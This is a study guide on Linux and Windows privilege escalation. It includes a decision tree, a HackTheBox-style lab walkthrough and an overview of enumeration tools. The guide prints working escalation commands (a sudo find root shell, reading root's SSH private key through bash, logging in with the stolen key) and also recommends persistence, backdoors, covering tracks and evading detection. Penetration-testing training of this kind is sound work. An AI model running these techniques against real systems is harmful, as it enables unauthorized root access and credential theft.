# Privilege Escalation (PrivEsc) - Comprehensive Learning Guide

---

## QUICK REFERENCE CARD

**Privilege Escalation Definition:**
```
Converting low-privilege user access → High-privilege user access
(user/www-data) → (root/SYSTEM)
```

**Why PrivEsc Matters:**
```
✓ Initial exploit = Low-privilege shell
✓ Most targets run low-privilege processes
✓ Real access needs admin/root privileges
✓ Most valuable data needs elevated access
✓ PrivEsc = Often easiest path to full compromise
```

**Two Types:**
```
1. Linux PrivEsc: user → root
2. Windows PrivEsc: user → administrator/SYSTEM
```

**Strategic Approach:**
```
1. Gain initial access (any user)
2. Thoroughly enumerate the box
3. Find internal vulnerabilities
4. Escalate privileges
5. Achieve full system compromise
```

---

# PRIVILEGE ESCALATION DECISION TREE & WORKFLOW

## The PrivEsc Process: Step-by-Step Flowchart

```
START: You have shell access (user/www-data)
│
├─── QUESTION 1: Are you already root?
│    ├─ YES → Done! Skip to post-exploitation
│    └─ NO → Continue to Question 2
│
├─── QUESTION 2: Can you read /etc/passwd?
│    ├─ YES → Check for password hashes, usernames
│    └─ NO → Continue to Question 3
│
├─── QUESTION 3: Run enumeration
│    ├─ Quick check (manual): id, whoami, sudo -l
│    ├─ Full check (script): LinPEAS/winPEAS
│    └─ Create detailed findings list
│
├─── QUESTION 4: Check for quick wins (fastest vectors first)
│    │
│    ├─ VECTOR A: Sudo NOPASSWD?
│    │  ├─ YES → Check GTFOBins → Exploit immediately ✓✓✓
│    │  └─ NO → Continue to B
│    │
│    ├─ VECTOR B: Exposed credentials?
│    │  ├─ YES → Try password reuse on root/other users ✓✓✓
│    │  └─ NO → Continue to C
│    │
│    ├─ VECTOR C: SSH keys readable?
│    │  ├─ YES → Copy /root/.ssh/id_rsa → SSH login ✓✓
│    │  └─ NO → Continue to D
│    │
│    ├─ VECTOR D: Weak file permissions?
│    │  ├─ YES (e.g., /etc/shadow readable)
│    │  │   └─ Crack hashes → Login as root ✓
│    │  └─ NO → Continue to E
│    │
│    └─ VECTOR E: None of the quick wins?
│       └─ Continue to Question 5
│
├─── QUESTION 5: Check for medium-effort vectors
│    │
│    ├─ VECTOR F: SUID/SGID binaries exploitable?
│    │  ├─ YES → Analyze & exploit ✓
│    │  └─ NO → Continue to G
│    │
│    ├─ VECTOR G: Cron jobs writable/modifiable?
│    │  ├─ YES → Add malicious script → Wait for execution ✓
│    │  └─ NO → Continue to H
│    │
│    ├─ VECTOR H: Scheduled tasks (Windows) exploitable?
│    │  ├─ YES → Create/modify task → Wait for execution ✓
│    │  └─ NO → Continue to I
│    │
│    └─ VECTOR I: None of the medium vectors?
│       └─ Continue to Question 6
│
├─── QUESTION 6: Check for harder vectors
│    │
│    ├─ VECTOR J: Old kernel with known exploits?
│    │  ├─ YES → Download exploit → Test in lab → Run carefully ✓
│    │  └─ NO → Continue to K
│    │
│    ├─ VECTOR K: Old software with known CVEs?
│    │  ├─ YES → Find exploit → Compile → Run ✓
│    │  └─ NO → Continue to L
│    │
│    └─ VECTOR L: Custom/unusual binaries exploitable?
│       ├─ YES → Analyze → Exploit ✓
│       └─ NO → Continue to Question 7
│
├─── QUESTION 7: Check for environment-specific vectors
│    │
│    ├─ VECTOR M: Service running as root?
│    │  ├─ YES → Can you interact with it? → Exploit it?
│    │  └─ NO → Continue to N
│    │
│    ├─ VECTOR N: Library hijacking possible?
│    │  ├─ YES → Create malicious library → LD_PRELOAD exploit
│    │  └─ NO → Continue to O
│    │
│    └─ VECTOR O: Race condition exploitable?
│       ├─ YES → Write exploit
│       └─ NO → Continue to Question 8
│
├─── QUESTION 8: Are you stuck?
│    │
│    ├─ YES → Review findings more carefully
│    │  ├─ Re-run enumeration with different approach
│    │  ├─ Look for subtle clues (misconfigurations, etc.)
│    │  ├─ Try less common vectors
│    │  └─ Research the OS/software for known issues
│    │
│    └─ NO → You found it!
│       └─ Proceed to exploitation
│
└─── SUCCESS: Root access achieved ✓
     └─ Establish persistence
     └─ Cover tracks (if needed)
     └─ Document findings
```

---

## Quick Decision Matrix: Which Vector First?

**Priority Order (Fastest → Slowest):**

| Priority | Vector | Time | Success % | Noise | Go First? |
|----------|--------|------|-----------|-------|-----------|
| 🔥 **1st** | **Sudo NOPASSWD** | 2 min | 95% | Silent | YES |
| 🔥 **2nd** | **Exposed Credentials** | 5 min | 90% | Silent | YES |
| 🔥 **3rd** | **SSH Keys** | 5 min | 85% | Silent | YES |
| ⚡ **4th** | **Weak Permissions** | 10 min | 80% | Silent | YES |
| ⚡ **5th** | **SUID Binaries** | 20 min | 70% | Medium | YES |
| ⏱️ **6th** | **Cron Jobs** | 5-60 min | 85% | Medium | YES |
| 🐌 **7th** | **Kernel Exploit** | 30 min | 60% | LOUD | Last Resort |
| 🐌 **8th** | **Software Exploit** | 30 min | 65% | LOUD | Last Resort |

---

## Workflow: Real-World PrivEsc Checklist

### Phase 1: Initial Reconnaissance (5 minutes)

```bash
# Step 1: Check if already root
$ id
uid=33(www-data) gid=33(www-data)  # Not root yet

# Step 2: Quick sudo check
$ sudo -l
[sudo] password for www-data: (no password needed!)
(root) NOPASSWD: /usr/bin/find

# FOUND IT! Move to Phase 2
```
> `id` shows current user/group; `sudo -l` lists allowed sudo commands without needing a password. Always run both immediately after getting a shell — `sudo -l` is the #1 fastest privesc check.

### Phase 2: Quick Win Exploitation (2-10 minutes)

```bash
# If sudo NOPASSWD found:
$ sudo -l
(root) NOPASSWD: /usr/bin/find

# Check GTFOBins for find
# gtfobins.github.io/find → Sudo section
# Copy command: sudo find / -exec /bin/sh \; -quit

# Execute:
$ sudo find / -exec /bin/sh \; -quit
root@target:~# id
uid=0(root)  # SUCCESS!
```
> `sudo find / -exec /bin/sh \; -quit` runs `find` as root and uses its `-exec` flag to spawn a root shell. The `\;` terminates the -exec command; `-quit` exits after the first match so it's instant.

### Phase 3: If Quick Wins Failed (20-60 minutes)

```bash
# Run full enumeration
$ ./linpeas.sh > output.txt

# Check each section:
# 1. User permissions
# 2. File permissions
# 3. Cron jobs
# 4. Installed software
# 5. Running processes
# 6. Kernel version

# Identify vulnerability
# Find exploit
# Test locally
# Execute on target
```
> Redirect output to a file so you can review it at your own pace. Focus on PEASS's color-coded highlights — red/yellow items are highest priority. Transfer linpeas.sh to the target via your HTTP server first.

### Phase 4: Verify Success

```bash
root@target:~# id
uid=0(root) gid=0(root) groups=0(root)

root@target:~# whoami
root

root@target:~# hostname
target
```
> Run these three to confirm root access. `id` shows `uid=0(root)` for confirmed root; `whoami` is a quick sanity check; `hostname` confirms you're still on the right box after shell stabilization.

---

## Decision Logic by Scenario

### Scenario 1: You Got Shell via RCE (No Password)

```
START
├─ Can run commands? YES
├─ Check sudo -l? (no password needed)
│  ├─ NOPASSWD found? → GTFOBins → Win!
│  └─ No NOPASSWD? → Continue
├─ Check for credentials
│  ├─ Found? → Try password reuse → Win!
│  └─ Not found? → Continue
└─ Run LinPEAS → Find other vectors
```

### Scenario 2: You Have Valid User Credentials

```
START
├─ Try sudo -l (you have password)
│  ├─ Any interesting sudo commands? → Exploit
│  └─ Nothing? → Continue
├─ Check for SSH keys in home dir
│  ├─ Found? → Use to login as root
│  └─ Not found? → Continue
├─ Check file permissions (readable files)
│  ├─ /etc/shadow readable? → Crack hashes
│  └─ Not readable? → Continue
└─ Run LinPEAS → Detailed analysis
```

### Scenario 3: Limited Shell (Can't Run Commands)

```
START
├─ Check if it's web shell
├─ Check what commands are allowed
├─ If file read available:
│  ├─ Read /etc/passwd → Get hashes
│  ├─ Read /etc/shadow (if readable)
│  └─ Read config files → Find credentials
├─ If file write available:
│  ├─ Write PHP shell to webroot
│  └─ Convert to reverse shell
└─ Escalate from upgraded shell
```

---

## Key Principles to Remember

### Principle 1: Always Check Sudo First
```
sudo -l is the FASTEST PrivEsc vector
Takes 2 seconds to check
Often leads to instant root
Do this FIRST every time!
```

### Principle 2: Credentials Are Your Friend
```
Exposed credentials = Often easiest path
Database password = User password = Root password
Check config files FIRST
Look for password reuse
```

### Principle 3: Lazy Admin = Your Advantage
```
Unpatched systems = Kernel exploits available
Old software = Known CVEs exist
Misconfigurations = Easy to exploit
Weak permissions = Your goldmine
```

### Principle 4: Persistence Over Speed
```
SSH keys > sudo access
Cron jobs > reverse shell
Permanent access > temporary access
Plan for the long game
```

### Principle 5: Know When to Stop
```
Try quick wins (5-10 minutes)
Try medium vectors (20-30 minutes)
Run enumeration script (10 minutes)
Analyze results (30+ minutes)
If stuck → Ask for hints or try different approach
```

---

## How to Use This Decision Tree

**In Real Time:**

1. **Gain initial access** → You have shell
2. **Open this decision tree** → Reference it
3. **Follow the questions** → Go down the tree
4. **Check each vector** → In priority order
5. **Exploit the first working vector** → Root achieved!

**Example Walkthrough:**

```
You: "I have shell as www-data"
Tree: Q1: Are you root? NO
You: "sudo -l"
Tree: Q4A: Found NOPASSWD?
You: "YES! /usr/bin/find"
Tree: "Go to GTFOBins, exploit immediately"
You: "sudo find / -exec /bin/sh \; -quit"
Result: "Root shell! ✓"
```

---

# REAL-WORLD CASE STUDY: PrivEsc Lab Walkthrough

## Scenario: Multi-Step PrivEsc (user1 → user2 → root)

### Attack Overview

```
Initial Access: SSH as user1 (credentials provided)
Objective 1: Read /home/user2/flag.txt
Objective 2: Escalate to root and read /root/flag.txt

Attack Chain:
user1 (SSH) → sudo -l → user2 (cd) → GTFOBins bash → 
Read flag1 → Find SSH key → SSH as root → Read flag2
```

---

### Phase 1: Initial Reconnaissance

**Step 1: Verify Connection**

```bash
# Check VPN connection to HTB
$ ping TARGET_IP
PING TARGET_IP (10.129.x.x): 56 data bytes
64 bytes from 10.129.x.x: icmp_seq=0 ttl=63 time=45.123 ms

# Connection confirmed!
```

**Step 2: SSH into Target**

```bash
$ ssh -p PORT# user1@TARGET_IP
user1@TARGET_IP's password: [provided]

user1@TARGET_IP:~$ id
uid=1000(user1) gid=1000(user1) groups=1000(user1)

# Initial access: user1 (not root yet)
```

**Step 3: Check Current Location**

```bash
user1@TARGET_IP:~$ pwd
/home/user1

user1@TARGET_IP:~$ ls
# (directory appears empty or limited files)
```

---

### Phase 2: First Privilege Escalation (user1 → user2)

**Step 1: Check Sudo Privileges (DECISION TREE: Question 4A)**

```bash
user1@TARGET_IP:~$ sudo -l
Matching Defaults entries for user1 on target:
    env_reset, mail_badpass, secure_path=...

User user1 may run the following commands without password:
    (user2) NOPASSWD: /bin/bash

# FOUND IT! Can run /bin/bash as user2 without password!
```
> `sudo -l` lists all sudo privileges for the current user. The `(user2) NOPASSWD:` line means you can run that binary as user2 with no password — immediate lateral movement.

**Key Finding:**
```
(user2) NOPASSWD: /bin/bash

What this means:
- Can execute /bin/bash as user2
- Don't need password
- Don't need to be root for this
- This is our vector!
```

**Step 2: Escalate to user2**

```bash
user1@TARGET_IP:~$ sudo -u user2 /bin/bash
user2@TARGET_IP:~$ pwd
/home/user2

user2@TARGET_IP:~$ id
uid=1001(user2) gid=1001(user2) groups=1001(user2)

# Successfully escalated to user2!
```
> `-u user2` specifies the target user; `/bin/bash` is the command to run as that user. Replace `user2` and `/bin/bash` with whatever the `sudo -l` output shows as allowed.

---

### Phase 3: First Flag (user2's Private Flag)

**Step 1: Find the Flag File**

```bash
user2@TARGET_IP:~$ ls -la
total 12
drwxr-xr-x 2 user2 user2 4096 Jan 25 10:30 .
drwxr-xr-x 3 root  root  4096 Jan 25 10:00 ..
-rw-r--r-- 1 user2 user2  40 Jan 25 10:30 flag.txt

# Flag file found! But no cat permissions
```

**Step 2: Attempt to Read (Problem)**

```bash
user2@TARGET_IP:~$ cat flag.txt
bash: cat: command not found

# cat command not available - need alternative method
```

**Step 3: Use GTFOBins for Bash File Read**

```
From GTFOBins bash page:
https://gtfobins.github.io/gtfobins/bash/

File Read:
bash -c 'echo "$(</path/to/input-file)"'
```

**Step 4: Read the Flag**

```bash
user2@TARGET_IP:~$ bash -c 'echo "$(</home/user2/flag.txt)"'
HTB{pr1v1lege_esc4l4t10n_p4rt_1}

# FLAG 1 CAPTURED!
```
> `$(</path/to/file)` is bash's built-in file-read syntax — works when `cat` is unavailable. Replace the path with any file you need to read; this is a key GTFOBins bash file-read technique.

**Key Learning:**
```
When restricted commands (cat, less, etc.) aren't available:
- Check GTFOBins for alternative file read methods
- Bash can read files: $(</path/to/file)
- This bypasses command restrictions
```

---

### Phase 4: Second Privilege Escalation (user2 → root)

**Step 1: Enumerate user2 Permissions**

```bash
user2@TARGET_IP:~$ sudo -l
[sudo] password for user2:
# Needs password - won't work

user2@TARGET_IP:~$ ls -la /root
ls: cannot open directory '/root': Permission denied

# Direct access denied
```

**Step 2: Look for SSH Keys (with stderr redirect)**

```
Problem: /root/.ssh/ not accessible
Solution: Use 2>/dev/null to suppress error messages
This still shows accessible files if they exist
```

**Command with 2>/dev/null:**

```bash
user2@TARGET_IP:~$ ls -la /root/.ssh 2>/dev/null
total 8
-rw------- 1 root root 1679 Jan 25 10:00 id_rsa
-rw-r--r-- 1 root root  380 Jan 25 10:00 id_rsa.pub

# SSH keys found! And readable!
```
> `2>/dev/null` discards error messages — if the directory is inaccessible you get silence instead of "Permission denied". If you see file listings, those files are world-readable and you can steal them.

**Key Learning:**
```
2>/dev/null redirects error messages
Lets you "peek" at restricted directories
If files are world-readable → You can see them
If files are restricted → Error suppressed silently
Useful for discovery without showing errors
```

---

### Phase 5: Read Root's Private SSH Key

**Step 1: Use GTFOBins to Read SSH Key**

```bash
user2@TARGET_IP:~$ bash -c 'echo "$(</root/.ssh/id_rsa)"'
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2x8z9k3L4m2P7q8R9v0X1a3B5c6D7e8F9g0H1i2J3k4L5m6N
7o8P9q0R1s2T3u4V5w6X7y8Z9a0B1c2D3e4F5g6H7i8J9k0L1m2N3o4P5q6R7s8T
9u0V1w2X3y4Z5a6B7c8D9e0F1g2H3i4J5k6L7m8N9o0P1q2R3s4T5u6V7w8X9y0Z
...
-----END RSA PRIVATE KEY-----

# Private key extracted!
```

---

### Phase 6: SSH as root (From Attacker Machine)

**Step 1: Exit Target Server**

```bash
user2@TARGET_IP:~$ exit

# Back on attacker machine
```

**Step 2: Save the Private Key**

```bash
$ nano root_key
# Paste the entire private key content
# Save and exit

$ ls -la root_key
-rw-r--r-- 1 user user 1679 Jan 25 15:30 root_key
```

**Step 3: Fix Key Permissions**

```bash
$ chmod 600 root_key

# Why 600?
# SSH requires restrictive permissions
# 600 = -rw------- (only owner can read/write)
# SSH will refuse to use improperly permissioned keys

$ ls -la root_key
-rw------- 1 user user 1679 Jan 25 15:30 root_key
# Now SSH will accept this key
```
> SSH refuses to use keys that are too permissive (it will say "Permissions too open" and exit). `chmod 600` sets owner read/write only — always do this before attempting to use a stolen key.

**Step 4: SSH as root Using Private Key**

```bash
$ ssh -p PORT# -i root_key root@TARGET_IP
root@TARGET_IP:~# id
uid=0(root) gid=0(root) groups=0(root)

# ROOT ACCESS ACHIEVED!
```
> `-i` specifies the private key file; `-p` sets the SSH port (default 22). Replace `root_key`, `root`, and `TARGET_IP` with your actual filename, target username, and IP.

---

### Phase 7: Capture Final Flag

**Step 1: Find Flag File**

```bash
root@TARGET_IP:~# ls -la
total 12
-rw-r--r-- 1 root root 40 Jan 25 10:30 flag.txt

# Flag file found at /root/flag.txt
```

**Step 2: Read the Flag**

```bash
root@TARGET_IP:~# cat flag.txt
HTB{r00t_3sc4l4t10n_c0mpl3t3d!}

# FLAG 2 CAPTURED!
```

---

## Key Lessons from This Attack

### Lesson 1: Decision Tree in Action

```
START: SSH as user1
↓
Q4A: Check sudo privileges → FOUND NOPASSWD!
↓
Exploit: sudo -u user2 /bin/bash
↓
Result: user2 access

START: Enumerate user2
↓
Q2: Check for SSH keys → FOUND in /root/.ssh!
↓
Use GTFOBins: bash -c 'echo "$(</path>)"'
↓
Result: Private key captured → Root SSH access
```

### Lesson 2: GTFOBins Saves the Day

```
Problem: cat command not available
Solution: GTFOBins shows bash file read method
Command: bash -c 'echo "$(</home/user2/flag.txt)"'
Result: Successfully read file without cat
```

### Lesson 3: stderr Redirection is Powerful

```
Problem: /root/.ssh permission denied
Solution: Use 2>/dev/null to suppress errors
Command: ls -la /root/.ssh 2>/dev/null
Result: Discover accessible SSH keys
```

### Lesson 4: Multiple Vectors Available

```
Vector 1: Sudo NOPASSWD → Quick escalation
Vector 2: SSH Keys → Persistent root access
Vector 3: GTFOBins → Bypass command restrictions
Combination = Total system compromise
```

### Lesson 5: Never Try to SSH on the Target

```
WRONG: SSH to root from user2 shell
WHY: Creates unnecessary noise, complex tunneling

RIGHT: 
1. Extract private key
2. Exit target shell
3. SSH from attacker machine
WHY: Direct, clean, traceable
```

---

## Attack Summary Table

| Phase | Action | Command | Result |
|-------|--------|---------|--------|
| **1** | Verify connection | `ping TARGET_IP` | Connected ✓ |
| **2** | SSH as user1 | `ssh -p PORT# user1@TARGET_IP` | user1 access ✓ |
| **3** | Check sudo | `sudo -l` | NOPASSWD: /bin/bash ✓ |
| **4** | Escalate to user2 | `sudo -u user2 /bin/bash` | user2 access ✓ |
| **5** | Read flag1 | `bash -c 'echo "$(</home/user2/flag.txt)"'` | Flag 1 captured ✓ |
| **6** | Find SSH key | `ls -la /root/.ssh 2>/dev/null` | id_rsa found ✓ |
| **7** | Read SSH key | `bash -c 'echo "$(</root/.ssh/id_rsa)"'` | Key extracted ✓ |
| **8** | Save key | `nano root_key` + paste | Key saved locally ✓ |
| **9** | Fix permissions | `chmod 600 root_key` | Permissions 600 ✓ |
| **10** | SSH as root | `ssh -i root_key root@TARGET_IP` | Root access ✓ |
| **11** | Read flag2 | `cat flag.txt` | Flag 2 captured ✓ |

---

## Mistakes Made & Learned

### Mistake 1: Jumping Ahead

```
WRONG: Tried to find SUID binaries, custom scripts, etc.
WHY: Overcomplicating when solution was simple

RIGHT: Check sudo -l FIRST (it was the answer)
LESSON: Follow the decision tree in priority order!
```

### Mistake 2: Trying to SSH from Target

```
WRONG: Attempted to SSH to root from user2 shell
WHY: Unnecessary complexity, routing issues

RIGHT: Extract key, exit, SSH from attacker machine
LESSON: Use the simplest path to root
```

### Mistake 3: Not Checking stderr Redirect

```
WRONG: Gave up when "ls /root/.ssh" showed permission denied

RIGHT: Added 2>/dev/null to suppress error and find readable files
LESSON: stderr redirection is your friend for discovery
```

---

## Decision Tree Applied: This Attack

```
START: user1 shell via SSH
│
├─── Q1: Are you root? NO
├─── Q2: Can you read /etc/passwd? (Not asked, moved on)
├─── Q3: Run enumeration
│    └─ Manual check: sudo -l
│
├─── Q4: Check for quick wins
│    │
│    └─ VECTOR A: Sudo NOPASSWD?
│       ├─ YES! (user2) NOPASSWD: /bin/bash
│       └─ EXPLOIT: sudo -u user2 /bin/bash
│          Result: user2 access ✓
│
├─── Back to Q4 (now as user2)
│    │
│    └─ VECTOR C: SSH keys readable?
│       ├─ YES! /root/.ssh/id_rsa (world readable!)
│       └─ EXPLOIT: Extract key → SSH as root
│          Result: root access ✓
│
└─── SUCCESS: Root achieved and flags captured!
```

---

## This Attack Demonstrates:

✅ Sudo NOPASSWD exploitation (Vector 1)  
✅ SSH Key theft (Vector 5)  
✅ GTFOBins for alternate file reading  
✅ Permission handling (chmod 600)  
✅ stderr redirection for discovery  
✅ Two-stage escalation (user1 → user2 → root)  
✅ Decision tree in real-world scenario  

---

## How to Use This Example

**When you encounter similar situations:**

1. **Check sudo -l FIRST** (90% of quick wins)
2. **If NOPASSWD found** → Use GTFOBins
3. **Look for SSH keys** (often world-readable)
4. **Use 2>/dev/null** for discovery without errors
5. **Follow the decision tree** → Don't jump ahead

This is a textbook example of methodical privilege escalation! 🎯

---

## Notes

# PART 1: PRIVILEGE ESCALATION FUNDAMENTALS

## The Problem: Limited Access

### Initial Access Reality

```
You exploit a vulnerability → Get shell access
BUT usually as LOW-PRIVILEGE USER:

Linux Examples:
✗ www-data (web server user)
✗ www (web server user)
✗ nobody (unprivileged user)
✗ Limited standard user

Windows Examples:
✗ IIS AppPool user
✗ Limited user account
✗ Service account (limited)
✗ Standard user (not admin)
```

### What You CAN'T do as Low-Privilege User:

```
❌ Read /etc/shadow (Linux)
❌ Access sensitive files
❌ Modify system files
❌ Stop/start services
❌ Install backdoors
❌ Achieve persistence
❌ Read other users' data
❌ Access admin functions
```

### What You NEED:

```
✅ Root (Linux) or Administrator/SYSTEM (Windows)
✅ Full system control
✅ Access to everything
✅ Ability to install persistence
✅ Complete compromise
```

---

## The Solution: Privilege Escalation

**Definition:**
```
Finding and exploiting LOCAL vulnerabilities
to escalate from low-privilege → high-privilege user
```

**Key Concept:**
```
PrivEsc is about INTERNAL vulnerabilities
NOT about exploiting remote services
You're already on the system
You're looking for weaknesses from inside
```

---

## Two Approaches to PrivEsc

### Approach 1: Manual Enumeration

```
Run specific commands
Check specific configurations
Look for specific weaknesses
Time-consuming but stealthy
Avoids triggering security tools
```

**Advantages:**
✓ Minimal noise
✓ Avoids detection
✓ Targeted approach
✓ Understand what you're doing

**Disadvantages:**
✗ Time-consuming
✗ Easy to miss things
✗ Requires knowledge

---

### Approach 2: Automated Scripts

```
Run enumeration script
Script checks everything automatically
Script reports findings
Fast and comprehensive
May create noise
```

**Advantages:**
✓ Fast
✓ Comprehensive
✓ Catches everything
✓ Great for learning

**Disadvantages:**
✗ Creates noise/logs
✗ May trigger AV/IDS
✗ May alert defenders
✗ Not stealthy

---

## PrivEsc Methodology

```
1. GAIN INITIAL ACCESS
   └─ Any user, any method
   └─ Shell access confirmed

2. ENUMERATE THOROUGHLY
   └─ Manual checks or automated scripts
   └─ Look for all weaknesses

3. IDENTIFY VULNERABILITIES
   └─ Find exploitable weaknesses
   └─ Assess feasibility

4. EXPLOIT VULNERABILITY
   └─ Execute exploit
   └─ Elevate privileges

5. VERIFY SUCCESS
   └─ Confirm root/admin access
   └─ id or whoami command

6. ESTABLISH PERSISTENCE
   └─ Create backdoor
   └─ Maintain access
   └─ Install persistence mechanism
```

---

# PART 2: ENUMERATION STRATEGIES

## Resource 1: HackTricks

**What it is:**
```
Comprehensive checklist for privilege escalation
Covers both Linux and Windows
Best maintained, constantly updated
https://book.hacktricks.xyz/
```

**Contains:**
```
✓ Linux Local Privilege Escalation
✓ Windows Local Privilege Escalation
✓ Common exploitation techniques
✓ Configuration vulnerabilities
✓ Service/process weaknesses
✓ File permission issues
✓ Kernel exploits
```

**Best For:**
```
✓ Reference guide
✓ Understanding concepts
✓ Learning approaches
✓ Manual enumeration
```

---

## Resource 2: PayloadsAllTheThings

**What it is:**
```
GitHub repository with exploitation payloads
Comprehensive checklists for both OS
Includes actual exploits and payloads
https://github.com/swisskyrepo/PayloadsAllTheThings
```

**Contains:**
```
✓ Linux PrivEsc checklist
✓ Windows PrivEsc checklist
✓ Actual exploit code
✓ Command examples
✓ One-liners for enumeration
```

**Best For:**
```
✓ Quick command reference
✓ Copy-paste commands
✓ Learning payloads
✓ Multi-OS comparison
```

---

## Resource 3: Automated Enumeration Scripts

### Common Linux Scripts

**LinEnum**
```
Purpose: Automated Linux enumeration
Creates comprehensive report
Shows potential vulnerabilities
```

**linuxprivchecker**
```
Purpose: Check for Linux vulnerabilities
Python-based enumeration
Highlights exploitable weaknesses
```

**PEASS (Privilege Escalation Awesome Scripts SUITE)**
```
Purpose: Well-maintained, up-to-date scripts
Includes both Linux and Windows versions
Actively maintained
Catches latest vulnerabilities
```

**LinPEAS** (PEASS for Linux)
```
Comprehensive Linux enumeration
Excellent colored output
Easy to read report
Most popular for Linux
```

---

### Common Windows Scripts

**Seatbelt**
```
Purpose: Windows enumeration tool
.NET-based
Gathers system information
Identifies potential vulnerabilities
```

**JAWS**
```
Purpose: Automated Windows privilege check
PowerShell-based
Comprehensive enumeration
Easy to run
```

**PEASS for Windows** (winPEAS)
```
Comprehensive Windows enumeration
Excellent output formatting
Finds common weaknesses
Well-maintained
```

---

## Important Security Consideration: AV/IDS Detection

### ⚠️ Critical Warning

```
These scripts create A LOT of noise:

✗ Runs many commands
✗ Generates process events
✗ Creates network activity
✗ Triggers system logging
✗ May be detected by monitoring tools
✗ Can alert defenders
✗ Can trigger antivirus
✗ Can cause system alerts
```

### When Detection Matters

```
STEALTH ENGAGEMENT:
❌ Don't run scripts
❌ May alert defenders
❌ May trigger incident response
❌ May compromise engagement

RED TEAM EXERCISE:
⚠️ Scripts may fail
⚠️ AV may block execution
⚠️ IDS may alert
⚠️ May fail at critical moment

LEARNING/LAB ENVIRONMENT:
✅ Run scripts freely
✅ No detection concerns
✅ Great for learning
✅ See all findings
```

### Solution: Manual Enumeration

```
When scripts won't work:
1. Run specific commands
2. Check specific configurations
3. Look for specific weaknesses
4. Takes more time
5. Creates less noise
6. Still effective
```

---

## Example: Running LinPEAS on Linux

### Command

```bash
./linpeas.sh
```
> Runs the full LinPEAS enumeration suite. Transfer to the target first via HTTP server; save output to a file (`./linpeas.sh | tee linpeas_out.txt`) so you can review it offline with color intact.

### What Happens

```
Script starts executing
Runs enumeration checks
Gathers system information
Displays colored output report
Highlights findings
Shows potential vulnerabilities
```

### Example Output Sections

```
====================================( System Info )====================================
Kernel: Linux target 5.10.0-8-amd64 #1 SMP
Hostname: target-box
OS: Linux target 5.10.0-8-amd64

====================================( Users )====================================
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),27(sudo)
uid=0(root)

====================================( SUDO without password )====================================
user ALL=(ALL) NOPASSWD: /usr/bin/find

====================================( Files with Capabilities )====================================
/usr/bin/ping cap_net_raw=ep

====================================( SUID/SGID Files )====================================
-rwsr-xr-x 1 root root /usr/bin/passwd
-rwsr-xr-x 1 root root /usr/bin/sudo

====================================( Interesting Files )====================================
-rw-r--r-- 1 root root /home/user/.ssh/id_rsa
```

---

## Reading Enumeration Output

### Key Sections to Check

```
1. USER & GROUP INFO
   └─ What user are you?
   └─ What groups do you belong to?
   └─ Any interesting group membership?

2. SUDO PRIVILEGES
   └─ Can you run commands as root?
   └─ Without password?
   └─ What commands allowed?

3. SUID/SGID FILES
   └─ Files running as different user
   └─ Potentially exploitable
   └─ Check if vulnerable

4. FILE CAPABILITIES
   └─ Special capabilities on files
   └─ May allow privilege escalation
   └─ Linux-specific

5. WRITABLE FILES/DIRECTORIES
   └─ Can you write to system files?
   └─ Can you modify configurations?
   └─ Potential backdoor paths

6. CRON JOBS
   └─ Scheduled tasks
   └─ Any as root?
   └─ Can you modify them?

7. INSTALLED SOFTWARE
   └─ Outdated applications?
   └─ Known vulnerabilities?
   └─ Exploitable versions?

8. RUNNING PROCESSES
   └─ What's running as root?
   └─ Any with vulnerabilities?
   └─ Any writable by you?
```

---

## Common Vulnerability Categories

### Category 1: Sudo Misconfiguration

```
User can run command as root without password
Example: user ALL=(ALL) NOPASSWD: /usr/bin/find

Exploit: Run command → Get root shell
Command: sudo find / -exec /bin/bash \; -quit
Result: Root shell access
```

---

### Category 2: SUID/SGID Binaries

```
File runs as different user (usually root)
Example: -rwsr-xr-x root /usr/bin/vulnerable-app

Exploit: If vulnerable → Get root shell
Requires: Finding vulnerable binary
Method: Analyze binary for flaws
```

---

### Category 3: File Capabilities

```
Special permissions on executables
Example: /usr/bin/ping has cap_net_raw

Exploit: Might allow privilege escalation
Linux-specific vulnerability
Requires: Understanding capabilities
```

---

### Category 4: Writable Directories

```
Can you write to system directories?
Example: /tmp, /var/tmp, /home directories

Exploit: Write malicious files
Create backdoor scripts
Modify configuration files
```

---

### Category 5: Cron Job Exploitation

```
Scheduled tasks running as root
Example: Script at /usr/local/bin/backup.sh runs hourly as root

Exploit: If you can modify script → Root execution
Method: Replace with malicious code
Result: Root code execution at scheduled time
```

---

### Category 6: Outdated Software

```
Old application version with known CVE
Example: Old kernel with privilege escalation exploit

Exploit: Use public exploit code
Method: Compile and run exploit
Result: Privilege escalation
```

---

### Category 7: Weak Permissions

```
Important files with wrong permissions
Example: /etc/shadow readable by everyone
Example: Configuration files writable by users

Exploit: Read sensitive data
Modify critical files
Create backdoors
```

---

### Category 8: Script/Binary Analysis

```
Analyze custom scripts or binaries
Look for bugs/flaws
Check for hard-coded credentials
Look for insecure practices

Exploit: Reverse engineer
Find vulnerability
Exploit it
```

---

## Manual Enumeration vs Scripts: Decision Tree

```
QUESTION 1: Stealth important?
   YES → Manual enumeration
   NO → Go to Question 2

QUESTION 2: Time available?
   LOTS → Scripts (comprehensive)
   LIMITED → Manual (target key areas)

QUESTION 3: Learning or production?
   LEARNING → Scripts (see everything)
   PRODUCTION → Manual (stealthy)

QUESTION 4: System has AV/IDS?
   YES → Manual (scripts may fail)
   NO → Scripts (safe to run)
```

---

## Key Takeaways - Part 1: PrivEsc Fundamentals

1. **Initial access = Low privilege:**
   - Exploits give you user shell, not root
   - Limited access to system
   - Need escalation for real impact

2. **PrivEsc = Internal vulnerability exploitation:**
   - Already on system
   - Looking for local weaknesses
   - Not remote exploitation

3. **Two enumeration approaches:**
   - Automated scripts (fast, noisy)
   - Manual enumeration (slow, stealthy)

4. **Multiple resources available:**
   - HackTricks (reference/learning)
   - PayloadsAllTheThings (quick reference)
   - PEASS/LinPEAS/winPEAS (comprehensive)

5. **Common vulnerability categories:**
   - Sudo misconfigurations
   - SUID/SGID binaries
   - File capabilities
   - Writable system directories
   - Cron job exploitation
   - Outdated software
   - Weak permissions
   - Script/binary flaws

6. **Detection vs stealth trade-off:**
   - Scripts are noisy
   - Manual is slower but stealthier
   - Context determines approach
   - Choose wisely

---

# PART 2: COMMON PRIVILEGE ESCALATION VECTORS

## Vector 1: Kernel Exploits

### The Concept

```
Unpatched/Old Operating System
    ↓
Contains known security vulnerabilities
    ↓
Kernel vulnerability exists in release
    ↓
Exploit public CVE → Get root access
```

**Key Insight:**
```
Older systems = More vulnerabilities
Unpatched systems = Known vulnerabilities
Kernel exploits = Direct path to root
```

---

